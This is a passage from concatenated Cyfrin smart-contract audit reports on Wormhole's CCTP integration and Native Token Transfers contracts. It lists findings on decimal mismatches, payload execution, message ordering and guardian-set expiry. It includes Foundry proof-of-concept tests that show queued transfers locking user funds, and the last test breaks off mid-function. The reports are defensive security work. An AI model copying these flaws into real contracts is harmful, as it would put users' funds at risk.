**Cyfrin:** Verified. The direct use of `ERC20::approve` has been modified to instead use `safeERC20::safeIncreaseAllowance`.


### Potential accounting error when the decimals of bridged assets differ between CCTP domains

The `FiatTokenV2_2` contract deployed to target CCTP domains typically has 6 decimals; however, on some chains, such as BNB Smart Chain, a decimal value of 18 is used. The Wormhole CCTP integration contract and the core CCTP contracts themselves do not reconcile any differences in the source/destination token decimals, which would cause critical issues in the amount to be minted on the target domain since these contracts are not working with Wormhole x-assets (where this issue is sufficiently mitigated) but rather native USDC/EURC on the respective chains.

For example, assuming both CCTP domains are intended to be supported, burning 20 tokens on BNB Smart Chain where USDC has 18 decimals, encoded as `20e18`, then trying to mint this amount on the destination chain where USDC has 6 decimals (e.g. Ethereum), then there is a problem because the recipient has not, in fact, minted `20e12` tokens instead of 20.

Since BNB Smart Chain is not one of the currently supported domains, and all currently supported CCTP domains use a version of the `FiatTokenV2_2` contract with 6 decimals, this is not an issue at present. If a non-standard domain is ever intended to be supported for cross-chain transfers, then it is important that any differences in the token decimals are correctly reconciled.

**Wormhole Foundation:** No need to change anything now but will have to make changes if CCTP introduces other chains. One to be aware of and keep and eye on going forwards.

**Cyfrin:** Acknowledged.


### `Setup` unnecessarily inherits OpenZeppelin `Context`

The `Setup` contract currently inherits OpenZeppelin `Context`; however, this is unnecessary as none of its functionality is used anywhere within the logic.

**Wormhole Foundation:** Fixed in [PR \#52](https://github.com/wormhole-foundation/wormhole-circle-integration/pull/52).

**Cyfrin:** Acknowledged.


### Potential dangers for inheriting applications executing the Wormhole payload

The Wormhole CCTP contracts are written to allow integration by both composition and inheritance. When calling `Logic::transferTokensWithPayload`, users are able to pass an arbitrary [Wormhole payload](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/bbc593d7f4caf2b59bf9de18a870e2df37ed6fd4/evm/src/contracts/CircleIntegration/Logic.sol#L34) that gets [parsed from the VAA](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/bbc593d7f4caf2b59bf9de18a870e2df37ed6fd4/evm/src/contracts/CircleIntegration/Logic.sol#L83) on the destination chain. It is our understanding that, if required, execution of this payload is intended to be the responsibility of the integrating application. As such, it has been noted that the behavior of payload execution has not been tested; however, the Wormhole payload does not necessarily need to be executed with an external call, since it could simply contain information that is useful to the inheriting contract.

In the case the payload is used as the input for an arbitrary external call, there is a risk here for the integrator. For applications inheriting the Wormhole CCTP contracts, execution of the payload will occur in the context of these contracts, which could be potentially dangerous. It is, therefore, the responsibility of the integrator to perform sufficient application-specific validation on the payload. This should be clearly documented.

**Wormhole Foundation:** The existing functionality is as intended.

**Cyfrin:** Acknowledged.


### Sequencing considerations should be clearly documented and communicated to integrators

The Wormhole CCTP integration contracts do not enforce in-sequence message execution by default as a design choice to prevent one message from blocking subsequent messages, instead opting to give integrators the ability to order transactions if they so need. Given it is the responsibility of integrating protocols to execute or otherwise consume the Wormhole payload transmitted by the integration contracts, it is possible for out-of-order executions to cause issues with both high severity and high likelihood if the ordering of message execution is not correctly handled. Wormhole VAAs do not have to be ordered and are effectively multicast, so this does not affect the integration insofar as the contracts in scope for this audit are concerned.

When it comes to handling generic payloads along with token transfers across different chains, corruption of the intended order could have non-trivial consequences for operations that are sensitive to order or timing, such as in lending or derivatives, given how deeply USDC is entrenched within the whole of DeFi. Consider the following scenario:
1. Alice transfers 1000 USDC from CCTP Domain A to Perp X on CCTP Domain B.
2. Alice sends another 100 USDC to Perp X, with a payload to open a 5000 USDC position at 5X leverage.
3. Alice's messages are executed on CCTP Doman B:
    1. If the first message is executed before the second, Alice has a margin of 1100, and the trade is correctly created on X.
    2. If the second message is executed before the first, the trade cannot be opened due to insufficient margin. Factoring in liquidations, auctions, and so on, out-of-sequence execution can have a plethora of unintended consequences.

As noted above, the sender has the ability to specify a Wormhole nonce, and there is also a Wormhole sequence number that is auto-incremented. These are both received on the destination chain in the VAA, so integrators wishing to enforce order can do so either by auto-incrementing the Wormhole nonce on the source domain or by using the Wormhole sequence number and then enforcing ordering on the target domain by checking the source chain, sender address, and nonce/sequence. This should be clearly documented and communicated to users.

**Wormhole Foundation:** Integrators requiring ordered transactions will have to enforce this themselves, which is intended behavior.

**Cyfrin:** Acknowledged.


### Calldata restriction on Wormhole payload should not be modified

Based on an end-to-end fork test written between Arbitrum and Avalanche C-Chain (15M block gas limit), a gas usage of ~2.5M units has been observed using the maximum allowed payload length of `type(uint16).max`. It is important that this calldata restriction is not modified; otherwise, a scenario could exist where it may not be possible for the `mintRecipient` to execute redemptions on the target domain due to an out-of-gas error caused by an [excessively large Wormhole payload](https://solodit.xyz/issues/h-2-malicious-user-can-use-an-excessively-large-_toaddress-in-oftcoresendfrom-to-break-layerzero-communication-sherlock-uxd-uxd-protocol-git). Even in the current state, integrators should be careful to ensure that any additional calls wrapping those to `Logic::redeemTokensWithPayload` cannot be made susceptible to this issue.

**Wormhole Foundation:** Acknowledged.

**Cyfrin:** Acknowledged.


### Temporary denial-of-service when in-flight messages are not executed before a deprecated Wormhole Guardian set expires

**Description:** Wormhole exposes a governance action in [`Governance::submitNewGuardianSet`](https://github.com/wormhole-foundation/wormhole/blob/eee4641f55954d2d0db47831688a2e97eb20f7ee/ethereum/contracts/Governance.sol#L76-L112) to update the Guardian set via Governance VAA.

```solidity
function submitNewGuardianSet(bytes memory _vm) public {
    ...

    // Trigger a time-based expiry of current guardianSet
    expireGuardianSet(getCurrentGuardianSetIndex());

    // Add the new guardianSet to guardianSets
    storeGuardianSet(upgrade.newGuardianSet, upgrade.newGuardianSetIndex);

    // Makes the new guardianSet effective
    updateGuardianSetIndex(upgrade.newGuardianSetIndex);
}
```

When this function is called, [`Setters:: expireGuardianSet`](https://github.com/wormhole-foundation/wormhole/blob/main/ethereum/contracts/Setters.sol#L13-L15) initiates a 24-hour timeframe after which the current guardian set expires.

```solidity
function expireGuardianSet(uint32 index) internal {
    _state.guardianSets[index].expirationTime = uint32(block.timestamp) + 86400;
}
```

Hence, any in-flight VAAs that utilize the deprecated Guardian set index will fail to be executed given the validation present in [`Messages::verifyVMInternal`](https://github.com/wormhole-foundation/wormhole/blob/main/ethereum/contracts/Messages.sol).

```solidity
/// @dev Checks if VM guardian set index matches the current index (unless the current set is expired).
if(vm.guardianSetIndex != getCurrentGuardianSetIndex() && guardianSet.expirationTime < block.timestamp){
    return (false, "guardian set has expired");
}
```

Considering there is no automatic relaying of Wormhole CCTP messages, counter to what is specified in the [documentation](https://docs.wormhole.com/wormhole/quick-start/tutorials/cctp) (unless an integrator implements their own relayer), there are no guarantees that an in-flight message which utilizes an old Guardian set index will be executed by the `mintRecipient` on the target domain within its 24-hour expiration period. This could occur, for example, in cases such as:
1. Integrator messages are blocked by their use of the Wormhole nonce/sequence number.
2. CCTP contracts are paused on the target domain, causing all redemptions to revert.
3. L2 sequencer downtime, since the Wormhole CCTP integration contracts do not consider aliased addresses for forced inclusion.
4. The `mintRecipient` is a contract that has been paused following an exploit, temporarily restricting all incoming and outgoing transfers.

In the current design, it is not possible to update the `mintRecipient` for a given deposit due to the multicast nature of VAAs. CCTP exposes [`MessageTransmitter::replaceMessage`](https://github.com/circlefin/evm-cctp-contracts/blob/1662356f9e60bb3f18cb6d09f95f628f0cc3637f/src/MessageTransmitter.sol#L129-L181) which allows the original source caller to update the destination caller for a given message and its corresponding attestation; however, the Wormhole CCTP integration currently provides no access to this function and has no similar functionality of its own to allow updates to the target `mintRecipient` of the VAA.

Additionally, there is no method for forcibly executing the redemption of USDC/EURC to the `mintRecipient`, which is the only address allowed to execute the VAA on the target domain, as validated in [`Logic::redeemTokensWithPayload`](https://github.com/wormhole-foundation/wormhole-circle-integration/blob/f7df33b159a71b163b8b5c7e7381c0d8f193da99/evm/src/contracts/CircleIntegration/Logic.sol#L61-L108).

```solidity
// Confirm that the caller is the `mintRecipient` to ensure atomic execution.
require(
    msg.sender.toUniversalAddress() == deposit.mintRecipient, "caller must be mintRecipient"
);
```

Without any programmatic method for replacing expired VAAs with new VAAs signed by the updated Guardian set, the source USDC/EURC will be burnt, but it will not be possible for the expired VAAs to be executed, leading to denial-of-service on the `mintRecipient` receiving tokens on the target domain. The Wormhole CCTP integration does, however, inherit some mitigations already in place for this type of scenario where the Guardian set is updated, as explained in the [Wormhole whitepaper](https://github.com/wormhole-foundation/wormhole/blob/eee4641f55954d2d0db47831688a2e97eb20f7ee/whitepapers/0003_token_bridge.md#caveats), meaning that it is possible to repair or otherwise replace the expired VAA for execution using signatures from the new Guardian set. In all cases, the original VAA metadata remains intact since the new VAA Guardian signatures refer to an event that has already been emitted, so none of the contents of the VAA payload besides the Guardian set index and associated signatures change on re-observation. This means that the new VAA can be safely paired with the existing Circle attestation for execution on the target domain by the original `mintRecipient`.

**Impact:** There is only a single address that is permitted to execute a given VAA on the target domain; however, there are several scenarios that have been identified where this `mintReceipient` may be unable to perform redemption for a period in excess of 24 hours following an update to the Guardian set while the VAA is in-flight. Fortunately, Wormhole Governance has a well-defined path to resolution, so the impact is limited.

**Proof of Concept:**
1. Alice burns 100 USDC to be transferred to dApp X from CCTP Domain A to CCTP Domain B.
2. Wormhole executes a Governance VAA to update the Guardian set.
3. 24 hours pass, causing the previous Guardian set to expire.
4. dApp X attempts to redeem 100 USDC on CCTP Domain B, but VAA verification fails because the message was signed using the expired Guardian set.
5. The 100 USDC remains burnt and cannot be minted on the target domain by executing the attested CCTP message until the expired VAA is reobserved by members of the new Guardian set.

**Recommended Mitigation:** The practicality of executing the proposed Governance mitigations at scale should be carefully considered, given the extent to which USDC is entrenched within the wider DeFi ecosystem. There is a high likelihood of temporary widespread, high-impact DoS, although this is somewhat limited by the understanding that Guardian set updates are expected to occur relatively infrequently, given there have only been three updates in the lifetime of Wormhole so far. There is also potentially insufficient tooling for the detailed VAA re-observation scenarios, which should handle the recombination of the signed CCTP message with the new VAA and clearly communicate these considerations to integrators.

**Wormhole Foundation:** This is the same as how the Wormhole token bridge operates.

**Cyfrin:** Acknowledged.


### The `mintRecipient` address should be required to indicate interface support to prevent potential loss of funds

If the destination `mintRecipient` is a smart contract, it should be required to implement `IERC165` and another Wormhole/CCTP-specific interface to ensure that it has the necessary functionality to transfer/approve USDC/EURC tokens. Whilst it is ultimately the responsibility of the integrator to ensure that they correctly handle the receipt of tokens, this recommendation should help to avoid situations where the tokens become irreversibly stuck after calling `Logic::redeemTokenWithPayload`.

**Wormhole Foundation:** Responsibility lies with the integrator to ensure their code works with the `CircleIntegration` logic.

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2024-04-09-cyfrin-wormhole-evm-cctp-v2-1.md ------


------ FILE START car/reports_md/2024-04-11-cyfrin-wormhole-evm-ntt-v2.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

**Assisting Auditors**

[Hans](https://twitter.com/hansfriese)


---

# Findings
## High Risk


### Queued transfers can become stuck on the source chain if Transceiver instructions are encoded in the incorrect order

**Description:** In the case of multiple Transceivers, the current logic expects that a sender encodes Transceiver instructions in order of increasing Transceiver registration index, as validated in [`TransceiverStructs::parseTransceiverInstructions`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/libraries/TransceiverStructs.sol#L326-L359). Under normal circumstances, this logic works as expected, and the transaction fails when the user packs transceiver instructions in the incorrect order.

```solidity
/* snip */
for (uint256 i = 0; i < instructionsLength; i++) {
    TransceiverInstruction memory instruction;
    (instruction, offset) = parseTransceiverInstructionUnchecked(encoded, offset);

    uint8 instructionIndex = instruction.index;

    // The instructions passed in have to be strictly increasing in terms of transceiver index
    if (i != 0 && instructionIndex <= lastIndex) {
        revert UnorderedInstructions();
    }
    lastIndex = instructionIndex;

    instructions[instructionIndex] = instruction;
}
/* snip */
```

However, this requirement on the order of Transceiver indices is not checked when transfers are initially queued for delayed execution. As a result, a transaction where this is the case will fail when the user calls `NttManager::completeOutboundQueuedTransfer` to execute a queued transfer.

**Impact:** The sender's funds are transferred to the NTT Manager when messages are queued. However, this queued message can never be executed if the Transceiver indices are incorrectly ordered and, as a result, the user funds remain stuck in the NTT Manager.

**Proof of Concept:** Run the following test:

```solidity
contract TestWrongTransceiverOrder is Test, INttManagerEvents, IRateLimiterEvents {
    NttManager nttManagerChain1;
    NttManager nttManagerChain2;

    using TrimmedAmountLib for uint256;
    using TrimmedAmountLib for TrimmedAmount;

    uint16 constant chainId1 = 7;
    uint16 constant chainId2 = 100;
    uint8 constant FAST_CONSISTENCY_LEVEL = 200;
    uint256 constant GAS_LIMIT = 500000;

    uint16 constant SENDING_CHAIN_ID = 1;
    uint256 constant DEVNET_GUARDIAN_PK =
        0xcfb12303a19cde580bb4dd771639b0d26bc68353645571a8cff516ab2ee113a0;
    WormholeSimulator guardian;
    uint256 initialBlockTimestamp;

    WormholeTransceiver wormholeTransceiverChain1;
    WormholeTransceiver wormholeTransceiver2Chain1;

    WormholeTransceiver wormholeTransceiverChain2;
    address userA = address(0x123);
    address userB = address(0x456);
    address userC = address(0x789);
    address userD = address(0xABC);

    address relayer = address(0x28D8F1Be96f97C1387e94A53e00eCcFb4E75175a);
    IWormhole wormhole = IWormhole(0x706abc4E45D419950511e474C7B9Ed348A4a716c);

    function setUp() public {
        string memory url = "https://goerli.blockpi.network/v1/rpc/public";
        vm.createSelectFork(url);
        initialBlockTimestamp = vm.getBlockTimestamp();

        guardian = new WormholeSimulator(address(wormhole), DEVNET_GUARDIAN_PK);

        vm.chainId(chainId1);
        DummyToken t1 = new DummyToken();
        NttManager implementation =
            new MockNttManagerContract(address(t1), INttManager.Mode.LOCKING, chainId1, 1 days);

        nttManagerChain1 =
            MockNttManagerContract(address(new ERC1967Proxy(address(implementation), "")));
        nttManagerChain1.initialize();

        WormholeTransceiver wormholeTransceiverChain1Implementation = new MockWormholeTransceiverContract(
            address(nttManagerChain1),
            address(wormhole),
            address(relayer),
            address(0x0),
            FAST_CONSISTENCY_LEVEL,
            GAS_LIMIT
        );
        wormholeTransceiverChain1 = MockWormholeTransceiverContract(
            address(new ERC1967Proxy(address(wormholeTransceiverChain1Implementation), ""))
        );

        WormholeTransceiver wormholeTransceiverChain1Implementation2 = new MockWormholeTransceiverContract(
            address(nttManagerChain1),
            address(wormhole),
            address(relayer),
            address(0x0),
            FAST_CONSISTENCY_LEVEL,
            GAS_LIMIT
        );
        wormholeTransceiver2Chain1 = MockWormholeTransceiverContract(
            address(new ERC1967Proxy(address(wormholeTransceiverChain1Implementation2), ""))
        );


        // Actually initialize properly now
        wormholeTransceiverChain1.initialize();
        wormholeTransceiver2Chain1.initialize();


        nttManagerChain1.setTransceiver(address(wormholeTransceiverChain1));
        nttManagerChain1.setTransceiver(address(wormholeTransceiver2Chain1));
        nttManagerChain1.setOutboundLimit(type(uint64).max);
        nttManagerChain1.setInboundLimit(type(uint64).max, chainId2);

        // Chain 2 setup
        vm.chainId(chainId2);
        DummyToken t2 = new DummyTokenMintAndBurn();
        NttManager implementationChain2 =
            new MockNttManagerContract(address(t2), INttManager.Mode.BURNING, chainId2, 1 days);

        nttManagerChain2 =
            MockNttManagerContract(address(new ERC1967Proxy(address(implementationChain2), "")));
        nttManagerChain2.initialize();

        WormholeTransceiver wormholeTransceiverChain2Implementation = new MockWormholeTransceiverContract(
            address(nttManagerChain2),
            address(wormhole),
            address(relayer),
            address(0x0),
            FAST_CONSISTENCY_LEVEL,
            GAS_LIMIT
        );

        wormholeTransceiverChain2 = MockWormholeTransceiverContract(
            address(new ERC1967Proxy(address(wormholeTransceiverChain2Implementation), ""))
        );
        wormholeTransceiverChain2.initialize();

        nttManagerChain2.setTransceiver(address(wormholeTransceiverChain2));
        nttManagerChain2.setOutboundLimit(type(uint64).max);
        nttManagerChain2.setInboundLimit(type(uint64).max, chainId1);

        // Register peer contracts for the nttManager and transceiver. Transceivers and nttManager each have the concept of peers here.
        nttManagerChain1.setPeer(chainId2, bytes32(uint256(uint160(address(nttManagerChain2)))), 9);
        nttManagerChain2.setPeer(chainId1, bytes32(uint256(uint160(address(nttManagerChain1)))), 7);

        // Set peers for the transceivers
        wormholeTransceiverChain1.setWormholePeer(
            chainId2, bytes32(uint256(uint160(address(wormholeTransceiverChain2))))
        );

       wormholeTransceiver2Chain1.setWormholePeer(
            chainId2, bytes32(uint256(uint160(address(wormholeTransceiverChain2))))
        );

        wormholeTransceiverChain2.setWormholePeer(
            chainId1, bytes32(uint256(uint160(address(wormholeTransceiverChain1))))
        );

        require(nttManagerChain1.getThreshold() != 0, "Threshold is zero with active transceivers");

        // Actually set it
        nttManagerChain1.setThreshold(2);
        nttManagerChain2.setThreshold(1);
    }

    function testWrongTransceiverOrder() external {
        vm.chainId(chainId1);

        // Setting up the transfer
        DummyToken token1 = DummyToken(nttManagerChain1.token());
        uint8 decimals = token1.decimals();

        token1.mintDummy(address(userA), 5 * 10 ** decimals);
        uint256 outboundLimit = 4 * 10 ** decimals;
        nttManagerChain1.setOutboundLimit(outboundLimit);

        vm.startPrank(userA);

        uint256 transferAmount = 5 * 10 ** decimals;
        token1.approve(address(nttManagerChain1), transferAmount);

        // transfer with shouldQueue == true
        uint64 qSeq = nttManagerChain1.transfer(
            transferAmount, chainId2, toWormholeFormat(userB), true, encodeTransceiverInstructionsJumbled(true)
        );

        assertEq(qSeq, 0);
        IRateLimiter.OutboundQueuedTransfer memory qt = nttManagerChain1.getOutboundQueuedTransfer(0);
        assertEq(qt.amount.getAmount(), transferAmount.trim(decimals, decimals).getAmount());
        assertEq(qt.recipientChain, chainId2);
        assertEq(qt.recipient, toWormholeFormat(userB));
        assertEq(qt.txTimestamp, initialBlockTimestamp);

        // assert that the contract also locked funds from the user
        assertEq(token1.balanceOf(address(userA)), 0);
        assertEq(token1.balanceOf(address(nttManagerChain1)), transferAmount);

         // elapse rate limit duration - 1
        uint256 durationElapsedTime = initialBlockTimestamp + nttManagerChain1.rateLimitDuration();

        vm.warp(durationElapsedTime);

        vm.expectRevert(0x71f23ef2); //UnorderedInstructions() selector
        nttManagerChain1.completeOutboundQueuedTransfer(0);
    }

    // Encode an instruction for each of the relayers
    function encodeTransceiverInstructionsJumbled(bool relayer_off) public view returns (bytes memory) {
        WormholeTransceiver.WormholeTransceiverInstruction memory instruction =
            IWormholeTransceiver.WormholeTransceiverInstruction(relayer_off);

        bytes memory encodedInstructionWormhole =
            wormholeTransceiverChain1.encodeWormholeTransceiverInstruction(instruction);

        TransceiverStructs.TransceiverInstruction memory TransceiverInstruction1 =
        TransceiverStructs.TransceiverInstruction({index: 0, payload: encodedInstructionWormhole});
        TransceiverStructs.TransceiverInstruction memory TransceiverInstruction2 =
        TransceiverStructs.TransceiverInstruction({index: 1, payload: encodedInstructionWormhole});

        TransceiverStructs.TransceiverInstruction[] memory TransceiverInstructions =
            new TransceiverStructs.TransceiverInstruction[](2);

        TransceiverInstructions[0] = TransceiverInstruction2;
        TransceiverInstructions[1] = TransceiverInstruction1;

        return TransceiverStructs.encodeTransceiverInstructions(TransceiverInstructions);
    }
}
```

**Recommended Mitigation:** When the transfer amount exceeds the current outbound capacity, verify the Transceiver instructions are ordered correctly before adding a message to the list of queued transfers.

**Wormhole Foundation:** Fixed in [PR \#368](https://github.com/wormhole-foundation/example-native-token-transfers/pull/368). With the cancel logic addition, we elected not to pre-validate in order to save gas.

**Cyfrin:** Verified. Cancellation of queued transfers appears to have been implemented correctly; however, validation of the Transceiver instructions remains deferred to the completion step.


### Queued transfers can become stuck on the source chain if new Transceivers are added or existing Transceivers are modified before completion

**Description:** When a sender transfers an amount that exceeds the current outbound capacity, such transfers are sent to a queue for delayed execution within [`NttManager::_transferEntrypoint`](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManager.sol#L306-L332). The rate limit duration is defined as an immutable variable determining the temporal lag between queueing and execution, with a typical rate limit duration being 24 hours.

```solidity
/* snip */
// now check rate limits
bool isAmountRateLimited = _isOutboundAmountRateLimited(internalAmount);
if (!shouldQueue && isAmountRateLimited) {
    revert NotEnoughCapacity(getCurrentOutboundCapacity(), amount);
}
if (shouldQueue && isAmountRateLimited) {
    // emit an event to notify the user that the transfer is rate limited
    emit OutboundTransferRateLimited(
        msg.sender, sequence, amount, getCurrentOutboundCapacity()
    );

    // queue up and return
    _enqueueOutboundTransfer(
        sequence,
        trimmedAmount,
        recipientChain,
        recipient,
        msg.sender,
        transceiverInstructions
    );

    // refund price quote back to sender
    _refundToSender(msg.value);

    // return the sequence in the queue
    return sequence;
}
/* snip */
```

In the event that new Transceivers are added or existing Transceivers are removed from the NTT Manager, any pending queued transfers within the rate limit duration can potentially revert. This is because senders might not have correctly packed the Transceiver instructions for a given Transceiver based on the new configuration, and a missing Transceiver instruction can potentially cause an array index out-of-bounds exception while calculating the delivery price when the instructions are [finally parsed](https://github.com/wormhole-foundation/example-native-token-transfers/blob/f4e2277b358349dbfb8a654d19a925628d48a8af/evm/src/NttManager/NttManager.sol#L357-L358). For example, if there are initially two Transceivers but an additional Transceiver is added while the transfer is rate-limited, the instructions array as shown below will be declared with a length of three, corresponding to the new number of enabled Transceivers; however, the transfer will have only encoded two Transceiver instructions based on the configuration at the time it was initiated.

```solidity
function parseTransceiverInstructions(
    bytes memory encoded,
    uint256 numEnabledTransceivers
) public pure returns (TransceiverInstruction[] memory) {
    uint256 offset = 0;
    uint256 instructionsLength;
    (instructionsLength, offset) = encoded.asUint8Unchecked(offset);

    // We allocate an array with the length of the number of enabled transceivers
    // This gives us the flexibility to not have to pass instructions for transceivers that
    // don't need them
    TransceiverInstruction[] memory instructions =
        new TransceiverInstruction[](numEnabledTransceivers);

    uint256 lastIndex = 0;
    for (uint256 i = 0; i < instructionsLength; i++) {
        TransceiverInstruction memory instruction;
        (instruction, offset) = parseTransceiverInstructionUnchecked(encoded, offset);

        uint8 instructionIndex = instruction.index;

        // The instructions passed in have to be strictly increasing in terms of transceiver index
        if (i != 0 && instructionIndex <= lastIndex) {
            revert UnorderedInstructions();
        }
        lastIndex = instructionIndex;

        instructions[instructionIndex] = instruction;
    }

    encoded.checkLength(offset);

    return instructions;
}
```

**Impact:** Missing Transceiver instructions prevents the total delivery price for the corresponding message from being calculated. This prevents any queued Transfers from being executed with the current list of transceivers. As a result, underlying sender funds will be stuck in the `NttManager` contract. Note that a similar issue occurs if the peer NTT manager contract is updated on the destination (say, after a redeployment on the source chain) before an in-flight attestation is received and executed, reverting with an invalid peer error.

**Proof of Concept:** Run the following test:
```solidity
contract TestTransceiverModification is Test, INttManagerEvents, IRateLimiterEvents {
    NttManager nttManagerChain1;
    NttManager nttManagerChain2;

    using TrimmedAmountLib for uint256;
    using TrimmedAmountLib for TrimmedAmount;

    uint16 constant chainId1 = 7;
    uint16 constant chainId2 = 100;
    uint8 constant FAST_CONSISTENCY_LEVEL = 200;
    uint256 constant GAS_LIMIT = 500000;

    uint16 constant SENDING_CHAIN_ID = 1;
    uint256 constant DEVNET_GUARDIAN_PK =
        0xcfb12303a19cde580bb4dd771639b0d26bc68353645571a8cff516ab2ee113a0;
    WormholeSimulator guardian;
    uint256 initialBlockTimestamp;

    WormholeTransceiver wormholeTransceiverChain1;
    WormholeTransceiver wormholeTransceiver2Chain1;
    WormholeTransceiver wormholeTransceiver3Chain1;

    WormholeTransceiver wormholeTransceiverChain2;
    address userA = address(0x123);
    address userB = address(0x456);
    address userC = address(0x789);
    address userD = address(0xABC);

    address relayer = address(0x28D8F1Be96f97C1387e94A53e00eCcFb4E75175a);
    IWormhole wormhole = IWormhole(0x706abc4E45D419950511e474C7B9Ed348A4a716c);

    function setUp() public {
        string memory url = "https://goerli.blockpi.network/v1/rpc/public";
        vm.createSelectFork(url);
        initialBlockTimestamp = vm.getBlockTimestamp();

        guardian = new WormholeSimulator(address(wormhole), DEVNET_GUARDIAN_PK);

        vm.chainId(chainId1);
        DummyToken t1 = new DummyToken();
        NttManager implementation =
            new MockNttManagerContract(address(t1), INttManager.Mode.LOCKING, chainId1, 1 days);

        nttManagerChain1 =
            MockNttManagerContract(address(new ERC1967Proxy(address(implementation), "")));
        nttManagerChain1.initialize();

        // transceiver 1
        WormholeTransceiver wormholeTransceiverChain1Implementation = new MockWormholeTransceiverContract(
            address(nttManagerChain1),
            address(wormhole),
            address(relayer),
            address(0x0),
            FAST_CONSISTENCY_LEVEL,
            GAS_LIMIT
        );
        wormholeTransceiverChain1 = MockWormholeTransceiverContract(
            address(new ERC1967Proxy(address(wormholeTransceiverChain1Implementation), ""))
        );

        // transceiver 2
        WormholeTransceiver wormholeTransceiverChain1Implementation2 = new MockWormholeTransceiverContract(
            address(nttManagerChain1),
            address(wormhole),
            address(relayer),
            address(0x0),
            FAST_CONSISTENCY_LEVEL,
            GAS_LIMIT
        );
        wormholeTransceiver2Chain1 = MockWormholeTransceiverContract(
            address(new ERC1967Proxy(address(wormholeTransceiverChain1Implementation2), ""))
        );

        // transceiver 3
        WormholeTransceiver wormholeTransceiverChain1Implementation3 = new MockWormholeTransceiverContract(
            address(nttManagerChain1),
            address(wormhole),
            address(relayer),
            address(0x0),
            FAST_CONSISTENCY_LEVEL,
            GAS_LIMIT
        );
        wormholeTransceiver3Chain1 = MockWormholeTransceiverContract(
            address(new ERC1967Proxy(address(wormholeTransceiverChain1Implementation3), ""))
        );


        // Actually initialize properly now
        wormholeTransceiverChain1.initialize();
        wormholeTransceiver2Chain1.initialize();
        wormholeTransceiver3Chain1.initialize();


        nttManagerChain1.setTransceiver(address(wormholeTransceiverChain1));
        nttManagerChain1.setTransceiver(address(wormholeTransceiver2Chain1));

        // third transceiver is NOT set at this point for nttManagerChain1
        nttManagerChain1.setOutboundLimit(type(uint64).max);
        nttManagerChain1.setInboundLimit(type(uint64).max, chainId2);

        // Chain 2 setup
        vm.chainId(chainId2);
        DummyToken t2 = new DummyTokenMintAndBurn();
        NttManager implementationChain2 =
            new MockNttManagerContract(address(t2), INttManager.Mode.BURNING, chainId2, 1 days);

        nttManagerChain2 =
            MockNttManagerContract(address(new ERC1967Proxy(address(implementationChain2), "")));
        nttManagerChain2.initialize();

        WormholeTransceiver wormholeTransceiverChain2Implementation = new MockWormholeTransceiverContract(
            address(nttManagerChain2),
            address(wormhole),
            address(relayer),
            address(0x0),
            FAST_CONSISTENCY_LEVEL,
            GAS_LIMIT
        );

        wormholeTransceiverChain2 = MockWormholeTransceiverContract(
            address(new ERC1967Proxy(address(wormholeTransceiverChain2Implementation), ""))
        );
        wormholeTransceiverChain2.initialize();

        nttManagerChain2.setTransceiver(address(wormholeTransceiverChain2));
        nttManagerChain2.setOutboundLimit(type(uint64).max);
        nttManagerChain2.setInboundLimit(type(uint64).max, chainId1);

        // Register peer contracts for the nttManager and transceiver. Transceivers and nttManager each have the concept of peers here.
        nttManagerChain1.setPeer(chainId2, bytes32(uint256(uint160(address(nttManagerChain2)))), 9);
        nttManagerChain2.setPeer(chainId1, bytes32(uint256(uint160(address(nttManagerChain1)))), 7);

        // Set peers for the transceivers
        wormholeTransceiverChain1.setWormholePeer(
            chainId2, bytes32(uint256(uint160(address(wormholeTransceiverChain2))))
        );

       wormholeTransceiver2Chain1.setWormholePeer(
            chainId2, bytes32(uint256(uint160(address(wormholeTransceiverChain2))))
        );

       wormholeTransceiver3Chain1.setWormholePeer(
            chainId2, bytes32(uint256(uint160(address(wormholeTransceiverChain2))))
        );


        wormholeTransceiverChain2.setWormholePeer(
            chainId1, bytes32(uint256(uint160(address(wormholeTransceiverChain1))))
        );


        require(nttManagerChain1.getThreshold() != 0, "Threshold is zero with active transceivers");

        // Actually set it
        nttManagerChain1.setThreshold(2);
        nttManagerChain2.setThreshold(1);
    }

    function testTransceiverModification() external {
        vm.chainId(chainId1);

        // Setting up the transfer
        DummyToken token1 = DummyToken(nttManagerChain1.token());
        uint8 decimals = token1.decimals();

        token1.mintDummy(address(userA), 5 * 10 ** decimals);
        uint256 outboundLimit = 4 * 10 ** decimals;
        nttManagerChain1.setOutboundLimit(outboundLimit);

        vm.startPrank(userA);

        uint256 transferAmount = 5 * 10 ** decimals;
        token1.approve(address(nttManagerChain1), transferAmount);

        // transfer with shouldQueue == true
        uint64 qSeq = nttManagerChain1.transfer(
            transferAmount, chainId2, toWormholeFormat(userB), true, encodeTransceiverInstructions(true)
        );
        vm.stopPrank();

        assertEq(qSeq, 0);
        IRateLimiter.OutboundQueuedTransfer memory qt = nttManagerChain1.getOutboundQueuedTransfer(0);
        assertEq(qt.amount.getAmount(), transferAmount.trim(decimals, decimals).getAmount());
        assertEq(qt.recipientChain, chainId2);
        assertEq(qt.recipient, toWormholeFormat(userB));
        assertEq(qt.txTimestamp, initialBlockTimestamp);

        // assert that the contract also locked funds from the user
        assertEq(token1.balanceOf(address(userA)), 0);
        assertEq(token1.balanceOf(address(nttManagerChain1)), transferAmount);


        // elapse some random time - 60 seconds
        uint256 durationElapsedTime = initialBlockTimestamp + 60;

        // now add a third transceiver
        nttManagerChain1.setTransceiver(address(wormholeTransceiver3Chain1));

        // verify that the third transceiver is added
        assertEq(nttManagerChain1.getTransceivers().length, 3);

        // remove second transceiver
        nttManagerChain1.removeTransceiver(address(wormholeTransceiver2Chain1));

          // verify that the second transceiver is removed
        assertEq(nttManagerChain1.getTransceivers().length, 2);

         // elapse rate limit duration
         durationElapsedTime = initialBlockTimestamp + nttManagerChain1.rateLimitDuration();

        vm.warp(durationElapsedTime);

        vm.expectRevert(stdError.indexOOBError); //index out of bounds - transceiver instructions array does not have a third element to access
        nttManagerChain1.completeOutboundQueuedTransfer(0);
    }

    // Encode an instruction for each of the relayers
  function encodeTransceiverInstructions(bool relayer_off) public view returns (bytes memory) {
